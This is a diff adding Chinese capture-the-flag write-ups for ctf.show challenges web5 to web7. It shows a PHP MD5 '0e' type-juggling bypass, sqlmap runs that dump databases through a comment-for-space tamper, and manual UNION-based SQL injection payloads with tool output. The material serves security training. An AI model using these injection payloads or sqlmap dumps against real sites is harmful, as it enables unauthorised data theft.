@@ -4798,7 +4798,7 @@ $sqlmap -u "https://f1ce97b7-b971-47ff-84e8-b5a94939de4c.challenge.ctf.show" --d
 查字段信息，得到回显内容`ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1}`。
 
 ```
-' or 1=1 union select 1,(select group_concat(flag) from web2.flag),3 #
+' or 1=1 union select 1,(select flag from web2.flag),3 #
 ```
 
 提交`ctfshow{fca92377-63b5-4bb3-9f92-d959315f6dc1}`即可。
@@ -4883,6 +4883,366 @@ ctfshow{baf8f06b-e89a-4359-b92e-179e029ea98c}
 ```
 
 提交`ctfshow{baf8f06b-e89a-4359-b92e-179e029ea98c}`即可。
+
+------
+
+### web5
+
+进入靶机后，看到页面内容如下：
+
+```php+HTML
+where is flag?
+<?php
+error_reporting(0);
+?>
+<html lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />
+    <title>ctf.show_web5</title>
+</head>
+<body>
+    <center>
+    <h2>ctf.show_web5</h2>
+    <hr>
+    <h3>
+    </center>
+    <?php
+        $flag="";
+        $v1=$_GET['v1'];
+        $v2=$_GET['v2'];
+        if(isset($v1) && isset($v2)){
+            if(!ctype_alpha($v1)){
+                die("v1 error");
+            }
+            if(!is_numeric($v2)){
+                die("v2 error");
+            }
+            if(md5($v1)==md5($v2)){
+                echo $flag;
+            }
+        }else{  
+            echo "where is flag?";
+        }
+    ?>
+</body>
+</html>
+```
+
+显然，这是道PHP的MD5绕过题，考察的是对PHP类型比较和MD5特性的理解。
+
+关键漏洞点在于：PHP 的弱类型比较（==）+ MD5 的 `0e` 哈希碰撞。
+
+ `QNKCDZO` 是最经典且符合`ctype_alpha()`的选择，其MD5是 `0e830400451993494058024219903391` → 符合`0e\d+`。`240610708`是符合`is_numeric()`的纯数字，其MD5值也符合`0e\d+`。
+
+- `$v1 = "QNKCDZO"` （纯字母，MD5 = `0e830400451993494058024219903391`）
+- `$v2 = "240610708"` （纯数字，MD5 = `0e462097431906509019562988736854`）
+
+```
+"0e830400451993494058024219903391" == "0e462097431906509019562988736854"
+// 在PHP中使用==弱类型比较时,它们看起来像科学计数法（以 0e 开头，后面全是数字），PHP会把它们当作数字来比较。 → true！因为它们的数值都等于0
+```
+
+因此`Payload`是`/?v1=QNKCDZO&v2=240610708`。
+
+发送请求后得到`ctfshow{911b4bff-9313-43b0-8ba8-819603ef5f98}`。
+
+------
+
+### web6
+
+进入靶机后看到一个跟之前的web2题一样的登录框。
+
+直接使用`sqlmap`进行爆破求解。在`sqlmap`中，参数`-v`用于设置输出详细级别，取值范围是0~6，控制`sqlmap`在终端中打印多少信息。`--level`设置测试等级，取值范围是0~5，控制`sqlmap`对哪些`HTTP`参数进行`SQL`注入测试。
+
+需要分析请求是否被WAF拦截时使用 `-v 3`看清通信过程；而自动化时通常使用`-v 0`或默认的`-v 1`。
+
+|  值  |       含义        |              -v（Verbosity Level）输出内容说明               |
+| :--: | :---------------: | :----------------------------------------------------------: |
+|  0   |      Silent       | 仅显示 成功注入结果 和 严重错误，几乎无日志。适合自动化脚本。 |
+|  1   |  Default（默认）  |     显示基本进度、检测到的注入点、数据库类型等关键信息。     |
+|  2   |      Verbose      | 在 level 1 基础上，增加 使用的 payload 技术（如 boolean-based、time-based）、DBMS 指纹识别过程。 |
+|  3   |   More verbose    | 显示 HTTP 请求头 和 响应头（不含 body）。便于分析请求是否被 WAF 拦截。 |
+|  4   |       Debug       | 显示 完整的 HTTP 请求与响应（含 body），包括原始 payload。对调试绕过非常有用。 |
+|  5   | Extremely verbose |    显示 内部 payload 构造细节、编码过程、测试逻辑分支等。    |
+|  6   |    All details    | 最高详细级别，包含 所有中间变量、SQL 语句构造、异常堆栈 等，用于开发者调试。 |
+
+以上是`-v`的取值含义，而`--level`的取值含义如下：
+
+|  值  |                     测试的参数范围                      |                             说明                             |
+| :--: | :-----------------------------------------------------: | :----------------------------------------------------------: |
+|  1   |       - GET 参数（URL query） - POST 参数（body）       | 默认级别，只测试最明显的输入点（如 URL 参数（GET请求）和 POST body 参数）。 |
+|  2   |               Level 1 + Cookie 头中的参数               |    会尝试对 Cookie 值进行注入测试（如 `PHPSESSID=xxx`）。    |
+|  3   |              Level 2 + User-Agent Referer               | 常见WAF绕过场景：有些系统会从HTTP请求头读取数据并拼接到SQL中（增加对 User-Agent、Referer等HTTP头的测试）。 |
+|  4   |      Level 3 + 其他 HTTP 头（如 Accept, Host 等）       |                 开始测试不太常见的头部字段。                 |
+|  5   | Level 4 + 所有可提取的参数 （包括自定义头、路径片段等） |  最大范围测试，可能产生大量请求，容易触发 WAF 或日志告警。   |
+
+查询所有数据库：
+
+```bash
+sqlmap -u "http://bba43ea3-57af-4af1-a328-5729e65e23ea.challenge.ctf.show/" --data "username=username&password=password" --dbs --tamper=space2comment --level=3 -v 3
+```
+
+可以在终端中看到以下输出：
+
+```
+[DEBUG] performed 33 queries in 14.46 seconds
+available databases [6]:
+[*] ctftraining
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+[*] web2
+```
+
+查询指定数据库`web2`中的所有表信息：
+
+```bash
+sqlmap -u "http://bba43ea3-57af-4af1-a328-5729e65e23ea.challenge.ctf.show/" --data "username=username&password=password" --tamper=space2comment --level=3 -v 3 -D web2 --tables
+```
+
+可以在终端中看到以下输出：
+
+```
+[DEBUG] performed 33 queries in 15.34 seconds
+Database: web2
+[2 tables]
++------+
+| user |
+| flag |
++------+
+```
+
+查询指定数据库`web2`中指定表`flag`的所有列信息：
+
+```bash
+sqlmap -u "http://bba43ea3-57af-4af1-a328-5729e65e23ea.challenge.ctf.show/" --data "username=username&password=password" --tamper=space2comment --level=3 -v 3 -D web2 T flag --columns
+```
+
+可以在终端中看到以下输出：
+
+```
+[DEBUG] performed 33 queries in 16.03 seconds
+
+Database: web2
+Table: flag
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| flag   | varchar(255) |
++--------+--------------+
+```
+
+查询指定数据库`web2`中指定表`flag`的指定字段`flag`信息：
+
+```bash
+sqlmap -u "http://bba43ea3-57af-4af1-a328-5729e65e23ea.challenge.ctf.show/" --data "username=username&password=password" --tamper=space2comment --level=3 -v 3 -D web2 -T flag -C flag --dump
+```
+
+可以在终端中看到以下输出：
+
+```
+[PAYLOAD] username'/**/AND/**/(SELECT/**/9580/**/FROM/**/(SELECT(SLEEP(1-(IF(ORD(MID((SELECT/**/IFNULL(CAST(flag/**/AS/**/NCHAR),0x20)/**/FROM/**/web2.flag/**/ORDER/**/BY/**/flag/**/LIMIT/**/0,1),46,1))>1,0,1)))))YVuv)/**/AND/**/'bwOt'='bwOt
+[INFO] retrieved: ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb}
+[DEBUG] performed 362 queries in 103.68 seconds
+[DEBUG] analyzing table dump for possible password hashes
+Database: web2
+Table: flag
+[1 entry]
++-----------------------------------------------+
+| flag                                          |
++-----------------------------------------------+
+| ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb} |
++-----------------------------------------------+
+```
+
+提交`ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb}`即可。
+
+根据`sqlmap`的调试结果，我们可以知道这道题是空格注释`/**/`，手动注入的步骤如下：
+
+```
+'/**/or/**/1=1/**/#
+```
+
+> 欢迎你，ctfshow
+
+判断列数，得知列数为3。
+
+```
+'/**/or/**/1=1/**/group/**/by/**/3#
+```
+
+> 欢迎你，ctfshow
+
+判断回显位置，得知回显位置为2
+
+```
+'/**/or/**/1=1/**/union/**/select/**/1,/**/2,/**/3#
+```
+
+> 欢迎你，ctfshow欢迎你，2
+
+获取数据库名称，得知数据库名为`web2`。
+
+```
+'/**/or/**/1=1/**/union/**/select/**/1,/**/database(),/**/3#
+```
+
+> 欢迎你，ctfshow欢迎你，web2
+
+根据数据库名`web2`爆破数据表，得到表名`flag`。
+
+```
+'/**/or/**/1=1/**/union/**/select/**/1,/**/group_concat(table_name),/**/3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#
+```
+
+>欢迎你，ctfshow欢迎你，flag,user
+
+根据数据库名`web2`和数据表名`flag`爆破数据列，得到列名`flag`。
+
+```
+'/**/or/**/1=1/**/union/**/select/**/1,/**/group_concat(column_name),/**/3/**/from/**/information_schema.columns/**/where/**/table_name='flag'#
+```
+
+> 欢迎你，ctfshow欢迎你，flag
+
+根据数据库名`web2`和数据表名`flag`和数据列名`flag`，得到字段信息。
+
+```
+'/**/or/**/1=1/**/union/**/select/**/1,/**/flag,/**/3/**/from/**/flag#
+```
+
+> 欢迎你，ctfshow欢迎你，ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb}
+
+提交`ctfshow{0d6ab4d1-f2e4-4562-b19b-db46cc2f61eb}`即可。
+
+------
+
+### web7
+
+进入靶机后，看到一个文章列表，点击第一篇文章会请求`/index.php?id=1`，第二篇是`?id=2`，第三篇是`?id=3`。由此可以想到本题考察点是`sql`注入。直接使用`sqlmap`爆破靶机。
+
+查询所有数据库：
+
+```bash
+sqlmap -u "https://2eba4e12-aa63-452e-8db2-13936ebc6738.challenge.ctf.show/index.php?id=1" --tamper=space2comment --dbs
+```
+
+可以在终端中看到以下输出：
+
+```
+[INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.20.1, PHP 7.3.11
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[INFO] fetching database names
+available databases [6]:
+[*] ctftraining
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+[*] web7
+```
+
+查询指定数据库`web7`中的所有表信息：
+
+```bash
+sqlmap -u "https://2eba4e12-aa63-452e-8db2-13936ebc6738.challenge.ctf.show/index.php?id=1" --tamper=space2comment -D web7 --tables
+```
+
+可以在终端中看到以下输出：
+
+```
+[INFO] fetching tables for database: 'web7'
+[WARNING] reflective value(s) found and filtering out
+Database: web7
+[3 tables]
++------+
+| page |
+| user |
+| flag |
++------+
+```
+
+查询指定数据库`web7`中指定表`flag`的所有列信息：
+
+```bash
+sqlmap -u "https://2eba4e12-aa63-452e-8db2-13936ebc6738.challenge.ctf.show/index.php?id=1" --tamper=space2comment -D web7 -T flag --columns
+```
+
+可以在终端中看到以下输出：
+
+```
+[INFO] fetching columns for table 'flag' in database 'web7'                       [WARNING] reflective value(s) found and filtering out
+Database: web7
+Table: flag
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| flag   | varchar(255) |
++--------+--------------+
+```
+
+查询指定数据库`web7`中指定表`flag`的指定字段`flag`信息：
+
+```bash
+sqlmap -u "https://2eba4e12-aa63-452e-8db2-13936ebc6738.challenge.ctf.show/index.php?id=1" --tamper=space2comment -D web7 -T flag -C flag --dump
+```
+
+可以在终端中看到以下输出：
+
+```
+[INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'web7'   [WARNING] reflective value(s) found and filtering out
+Database: web7
+Table: flag
+[1 entry]
++-----------------------------------------------+
+| flag                                          |
++-----------------------------------------------+
+| ctfshow{3622793f-418f-4603-be59-62fdd8dae124} |
++-----------------------------------------------+
+```
+
+提交`ctfshow{3622793f-418f-4603-be59-62fdd8dae124}`即可。
+
+手动注入的步骤如下：
+
+构造永真条件`?id=1/**/and/**/1`发现显示第一篇文章，而`?id=1/**/and/**/0`无文章显示，说明这道题为数值型注入。
+
+先来判断显示位，`id`传参`-1`，因为`id`通常为正数，后端根据`id`查询不到内容就只能展示联合查询的结果，从而判断出字段回显位为2。
+
+```
+-1/**/union/**/select/**/1,2,3
+```
+
+查询当前数据库名称为`web7`。
+
+```
+-1/**/union/**/select/**/1,database(),3
+```
+
+查询当前数据库`web7`中的所有数据表信息，得到`flag,page,user`。
+
+```
+-1/**/union/**/select/**/1,(select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),3
+```
+
+根据数据库名`web7`和数据表名`flag`爆破数据列，得到列名`flag`。如果输入`table_name='flag'`字段，会无回显内容，因为`'`被转义为了`%27`，此时我们可以用`'flag'`的HEX值`0x666c6167`绕过。
+
+```
+-1/**/union/**/select/**/1,(select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=0x666c6167),3
+```
+
+根据数据库名`web2`和数据表名`flag`和数据列名`flag`，得到字段信息。
+
+```
+-1/**/union/**/select/**/1,(select/**/flag/**/from/**/web7.flag),3
+```
+
+提交`ctfshow{3622793f-418f-4603-be59-62fdd8dae124}`即可。
 
 ------
 
